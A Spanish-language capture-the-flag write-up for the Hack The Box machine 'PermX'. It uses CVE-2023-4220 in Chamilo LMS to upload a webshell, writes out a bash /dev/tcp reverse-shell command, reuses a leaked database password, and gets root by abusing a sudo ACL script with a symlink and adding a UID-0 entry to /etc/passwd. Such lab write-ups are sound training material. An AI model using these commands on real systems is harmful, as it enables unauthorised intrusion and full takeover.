---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PermX

`PermX` es una máquina Linux de dificultad fácil que cuenta con un sistema de gestión de aprendizaje vulnerable a la carga de archivos sin restricciones a través de [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). Esta vulnerabilidad se aprovecha para obtener un punto de apoyo en la máquina. Al enumerar la máquina se revelan las credenciales que conducen al acceso SSH. Luego se explota una configuración incorrecta de `sudo` para obtener un shell `root`.

<figure><img src="../../.gitbook/assets/PermX.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **PermX**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.23 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 19:45 CET
Initiating SYN Stealth Scan at 19:45
Scanning 10.10.11.23 [65535 ports]
Discovered open port 22/tcp on 10.10.11.23
Discovered open port 80/tcp on 10.10.11.23
Completed SYN Stealth Scan at 19:45, 21.83s elapsed (65535 total ports)
Nmap scan report for 10.10.11.23
Host is up, received user-set (0.064s latency).
Scanned at 2025-02-13 19:45:27 CET for 22s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
           Raw packets sent: 69837 (3.073MB) | Rcvd: 69847 (2.794MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.23
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.

```bash
❯ nmap -sCV -p22,80 10.10.11.23 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 19:46 CET
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   97.53 ms 10.10.16.1
2   52.52 ms permx.htb (10.10.11.23)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds

```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep permx
10.10.11.23 permx.htb
```

## Web Enumeration

Realizaremos una comprobación de las tecnologías que utiliza el sitio web.

```bash
❯ whatweb http://permx.htb/
http://permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], JQuery[3.4.1], Script, Title[eLEARNING]
```

Accederemos a [http://permx.htb](http://permx.htb) y nos encontramos con la siguiente página web, parece tratarse de una página de un servicio de Learning.

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizaremos una enumeración de directorios de la página web a través de `gobuster`. Obtuvimos el siguiente resultado, sin ninguna información relevante.

```bash
❯ gobuster dir -u http://permx.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 503,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://permx.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,503
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
```

### Subdomain Enumeration

Enumeramos posibles subdominios de la página web a través de `wfuzz` y logramos enumerar un subdominio llamado `lms.permx.htb`.

```bash
❯ wfuzz --hw=26 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.permx.htb" http://permx.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000173:   200        586 L    2466 W     36182 Ch    "www"                                                                                                                                                                
000004048:   200        586 L    2466 W     36182 Ch    "WWW"                                                                                                                                                                
000025584:   200        352 L    940 W      19347 Ch    "lms"   
```

Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep permx
10.10.11.23 permx.htb lms.permx.htb
```

Realizaremos una comprobación de las tecnologías que utiliza el sitio web.

```bash
❯ whatweb http://lms.permx.htb/
http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```

Al acceder a http://lmx.permx.htb, nos encontramos con un sitio web de `Chamilo LMS`. No logramos encontrar credenciales de defecto de la plataforma.

{% hint style="info" %}
Chamilo LMS es una plataforma de e-learning libre, licenciada bajo la GNU/GPLv3, de gestión del aprendizaje presencial, semi-presencial o virtual, cuyo propósito es mejorar la educación y su acceso a ella a nivel mundial.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al realizar una enumeración de directorios y archivos a través de `dirsearch`, logramos obtener diferentes archivos, como el `README` o `robots.txt`.

```bash
❯ dirsearch -u 'http://lms.permx.htb/' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/PermX/PermX/reports/http_lms.permx.htb/__25-02-13_19-50-36.txt

Target: http://lms.permx.htb/

[19:50:36] Starting: 
[19:50:37] 200 -   46B  - /.bowerrc
[19:50:37] 200 -    2KB - /.codeclimate.yml
[19:50:40] 200 -    3KB - /.scrutinizer.yml
[19:50:40] 200 -    4KB - /.travis.yml
[19:50:52] 200 -  540B  - /app/cache/
[19:50:52] 200 -  708B  - /app/
[19:50:52] 200 -  407B  - /app/logs/
[19:50:52] 200 -  101KB - /app/bootstrap.php.cache
[19:50:55] 200 -  455B  - /bin/
[19:50:56] 200 -    1KB - /bower.json
[19:51:00] 200 -    7KB - /composer.json
[19:51:00] 200 -  587KB - /composer.lock
[19:51:01] 200 -    5KB - /CONTRIBUTING.md
[19:51:04] 200 -    1KB - /documentation/
[19:51:07] 200 -    2KB - /favicon.ico
[19:51:11] 200 -    4KB - /index.php/login/
[19:51:11] 200 -    4KB - /index.php
[19:51:14] 200 -   34KB - /LICENSE
[19:51:14] 200 -  842B  - /license.txt
[19:51:16] 200 -   97B  - /main/
[19:51:27] 200 -    8KB - /README.md
[19:51:28] 200 -  403B  - /robots.txt
[19:51:32] 200 -  444B  - /src/
[19:51:39] 200 -    0B  - /vendor/composer/ClassLoader.php
[19:51:39] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[19:51:39] 200 -    0B  - /vendor/composer/autoload_files.php
[19:51:39] 200 -    1KB - /vendor/
[19:51:39] 200 -    0B  - /vendor/composer/autoload_psr4.php
[19:51:39] 200 -    0B  - /vendor/composer/autoload_real.php
[19:51:39] 200 -    1KB - /vendor/composer/LICENSE
[19:51:39] 200 -    0B  - /vendor/composer/autoload_classmap.php
[19:51:39] 200 -    0B  - /vendor/autoload.php
[19:51:39] 200 -    0B  - /vendor/composer/autoload_static.php
[19:51:40] 200 -  531KB - /vendor/composer/installed.json
[19:51:41] 200 -    6KB - /web.config
[19:51:41] 200 -  479B  - /web/

Task Completed
```

## Initial Foothold

### Chamilo LMS - Unrestricted File Upload \[Remote Code Execution] (CVE-2023-4220)

Analizamos el archivo `README.md`, y logramos obtener la versión de `Chamilo LMS`.

```bash
❯ curl -s 'http://lms.permx.htb/README.md' | head -n 1
# Chamilo 1.11.x
```

Al realizar una búsqueda por Internet de posibles vulnerabilidades de esta versión, nos encontramos con el siguiente `CVE-2023-4220`.

{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-4220" %}

{% hint style="danger" %}
Carga de archivos sin restricciones en la funcionalidad de carga de archivos grandes en **/main/inc/lib/javascript/bigupload/inc/bigUpload.php** en Chamilo LMS
{% endhint %}

Por otro lado, también logramos encontrar el siguiente repositorio de GitHub que nos permite realizar la explotación de dicha vulnerabilidad de `Unrestricted File Upload`.

{% embed url="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc" %}

```bash
❯ git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc; cd chamilo-lms-unauthenticated-big-upload-rce-poc
Clonando en 'chamilo-lms-unauthenticated-big-upload-rce-poc'...
remote: Enumerating objects: 53, done.
remote: Counting objects: 100% (53/53), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 53 (delta 27), reused 34 (delta 17), pack-reused 0 (from 0)
Recibiendo objetos: 100% (53/53), 16.08 KiB | 3.22 MiB/s, listo.
Resolviendo deltas: 100% (27/27), listo.
```

El primer paso, será lograr escanear la página web para verificar si es vulnerable. Esto lo podremos comprobar a través del módulo `scan` que nos ofrece el exploit.

```bash
❯ python3 main.py -u http://lms.permx.htb -a scan

[+] Target is likely vulnerable. Go ahead. [+]
```

Una vez localizado que el target es vulnerable, el siguiente paso será lograr subir una `webshell` al `Chamilo LMS`. Al ejecutar el exploit, se nos proporciona el acceso a la `webshell`.

```bash
❯ python3 main.py -u http://lms.permx.htb -a webshell

Enter the name of the webshell file that will be placed on the target server (default: webshell.php): gzzcoo.php

[+] Upload successfull [+]

Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=<command>
```

Realizamos la comprobación para verificar si podemos llegar a ejecutar comandos. Probamos de ejecutar el comando `whoami` y obtuvimos el resultado esperado.

```bash
❯ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=whoami'
www-data
```

El siguiente paso será lograr tener acceso al equipo. Por lo tanto, nos pondremos en escucha con la herramienta de `nc`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ejecutaremos en la `webshell` que disponemos el siguiente comando para lograr obtener una Reverse Shell.

```bash
❯ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=/bin/bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/10.10.16.7/443%200>%261"'
```

Volviendo a nuestra terminal, verificamos que hemos logrado obtener acceso al sistema como usuario `www-data`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.23] 39420
bash: cannot set terminal process group (1174): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

## Initial Access

### Information Leakage

Revisamos si disponemos de algún privilegio o grupo que podamos intentar aprovecharnos para escalar privilegios o movernos lateralmente, pero no logramos obtener resultado positivo.

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
```

Enumerando el directorio de `/var/www/chamilo/app/config`, realizamos una búsqueda recursiva en todos los archivos para ver si había algún string con el valor `password`. Finalmente parece haber obtenido unas credenciales de la base de datos.

```bash
www-data@permx:/var/www/chamilo/app/config$ ls -l
total 268
-rwxr-xr-x 1 www-data www-data    265 Aug 31  2023 add_course.conf.dist.php
-rw-r--r-- 1 www-data www-data    265 Jan 20  2024 add_course.conf.php
-rwxr-xr-x 1 www-data www-data  15758 Aug 31  2023 assetic.yml
-rwxr-xr-x 1 www-data www-data   6502 Aug 31  2023 auth.conf.dist.php
-rw-r--r-- 1 www-data www-data   6502 Jan 20  2024 auth.conf.php
-rwxr-xr-x 1 www-data www-data   9381 Aug 31  2023 config.yml
-rwxr-xr-x 1 www-data www-data   1583 Aug 31  2023 config_dev.yml
-rwxr-xr-x 1 www-data www-data    622 Aug 31  2023 config_prod.yml
-rw-r--r-- 1 www-data www-data 127902 Jan 20  2024 configuration.php
-rwxr-xr-x 1 www-data www-data    176 Aug 31  2023 course_info.conf.dist.php
-rw-r--r-- 1 www-data www-data    176 Jan 20  2024 course_info.conf.php
-rwxr-xr-x 1 www-data www-data   3312 Aug 31  2023 events.conf.dist.php
-rw-r--r-- 1 www-data www-data   3312 Jan 20  2024 events.conf.php
drwxr-xr-x 2 www-data www-data   4096 Aug 31  2023 fos
-rwxr-xr-x 1 www-data www-data   2036 Aug 31  2023 ivory_ckeditor.yml
-rwxr-xr-x 1 www-data www-data   3396 Aug 31  2023 mail.conf.dist.php
-rw-r--r-- 1 www-data www-data   3396 Jan 20  2024 mail.conf.php
-rwxr-xr-x 1 www-data www-data    151 Aug 31  2023 migrations.yml
drwxr-xr-x 2 www-data www-data   4096 Aug 31  2023 mopa
-rwxr-xr-x 1 www-data www-data   1131 Aug 31  2023 parameters.yml.dist
-rwxr-xr-x 1 www-data www-data   1340 Aug 31  2023 profile.conf.dist.php
-rw-r--r-- 1 www-data www-data   1340 Jan 20  2024 profile.conf.php
-rwxr-xr-x 1 www-data www-data   2170 Aug 31  2023 routing.yml
-rwxr-xr-x 1 www-data www-data    561 Aug 31  2023 routing_admin.yml
-rwxr-xr-x 1 www-data www-data    594 Aug 31  2023 routing_dev.yml
-rwxr-xr-x 1 www-data www-data   2162 Aug 31  2023 routing_front.yml
-rwxr-xr-x 1 www-data www-data   2802 Aug 31  2023 security.yml
-rwxr-xr-x 1 www-data www-data    150 Aug 31  2023 services.yml
drwxr-xr-x 2 www-data www-data   4096 Aug 31  2023 sonata

www-data@permx:/var/www/chamilo/app/config$ grep -r password *
auth.conf.dist.php:  //admin password
auth.conf.dist.php:  'admin_password' => 'pass',
auth.conf.dist.php:    'password' => 'userPassword',
auth.conf.dist.php:$langMainInfoDetail = '<p>OpenID is a secure way to use one user ID and password to log in to many web sites without special software, giving the same password to each site, or losing control over which information is shared with each site that you visit.</p>';
auth.conf.php:  //admin password
auth.conf.php:  'admin_password' => 'pass',
auth.conf.php:    'password' => 'userPassword',
auth.conf.php:$langMainInfoDetail = '<p>OpenID is a secure way to use one user ID and password to log in to many web sites without special software, giving the same password to each site, or losing control over which information is shared with each site that you visit.</p>';
config.yml:                password: "%database_password%"
config.yml:    password:  "%mailer_password%"
configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

De los usuarios que disponen `bash` que enumeramos en `/etc/passwd`, probamos de autenticarnos con el usuario `mtz` y las credenciales obtenidas anteriormente y logramos el acceso.

Visualizamos finalmente la flag de **user.txt**.

```bash
www-data@permx:/var/www/chamilo/app/config$ su mtz
Password: 
mtz@permx:/var/www/chamilo/app/config$ cat /home/mtz/user.txt 
a0fcaa21eec2*************************
```

## Privilege Escalation

### Abusing sudoers privilege

Revisamos los grupos a los que forma parte el usuario `mtz`, no obtenemos resultado relevante. Comprobando los permisos de `sudoers`, verificamos que podemos ejecutar como `sudo` el script que se encuentra en `/opt/acl.sh`.

```bash
mtz@permx:/var/www/chamilo/app/config$ id
uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
mtz@permx:/var/www/chamilo/app/config$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

El script intenta restringir el acceso solo a archivos dentro de `/home/mtz/`, pero la validación es defectuosa:

* Solo verifica que `$target` empiece con `/home/mtz/`, pero no bloquea correctamente rutas absolutas o enlaces simbólicos.
* El check `"$target" == *..*` no es suficiente para prevenir **Path Traversal**.

Si podemos ejecutar este script como `sudo`, podemos modificar permisos de cualquier archivo arbitrario fuera de `/home/mtz/`.

```bash
mtz@permx:/var/www/chamilo/app/config$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Verificamos el uso del script, en el cual se debe indicar el usuario que se le otorgarán los permisos, el tipo de permisos y el archivo.

```bash
mtz@permx:~$ sudo /opt/acl.sh 
Usage: /opt/acl.sh user perm file
```

Creamos un enlace simbólico apuntando a `/etc/passwd`. Usamos el script vulnerable para modificar los permisos ACL de `/etc/passwd`, otorgándonos control total. Verificamos que tenemos permisos de escritura sobre el archivo indicado, con lo cual podríamos llegar a editar el `/etc/passwd` y añadir una nueva entrada de un nuevo usuario `root`.

```bash
mtz@permx:~$ ln -s /etc/passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd 
mtz@permx:~$ getfacl /etc/passwd
getfacl: Removing leading '/' from absolute path names
# file: etc/passwd
# owner: root
# group: root
user::rw-
user:mtz:rwx
group::r--
mask::rwx
other::r--
```

Desde nuestro equipo, generaremos una nueva contraseña con `openssl`.

```bash
❯ openssl passwd -1 gzzcoo
$1$ueWnORoK$bD1TcxJC6k99dh8sYay981
```

Agregaremos un nuevo usuario (**gzzcoo**) con `UID 0` (**root**) a `/etc/passwd`. Verificamos que la entrada se ha añadido correctamente.

```bash
mtz@permx:~$ echo 'gzzcoo:$1$4L3Rt/1x$sPjy3MZ5oXnuvx8L.Bi350:0:0:gzzcoo:/root:/bin/bash' >> /etc/passwd

mtz@permx:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
gzzcoo:$1$4L3Rt/1x$sPjy3MZ5oXnuvx8L.Bi350:0:0:gzzcoo:/root:/bin/bash
```

Finalmente, nos cambiamos al usuario creado y obtenemos acceso como usuario `root`, con lo cual podemos visualizar la flag de **root.txt**.

```bash
mtz@permx:~$ su gzzcoo
Password: 
root@permx:/home/mtz# cat /root/root.txt 
f9e947624c29********************
```
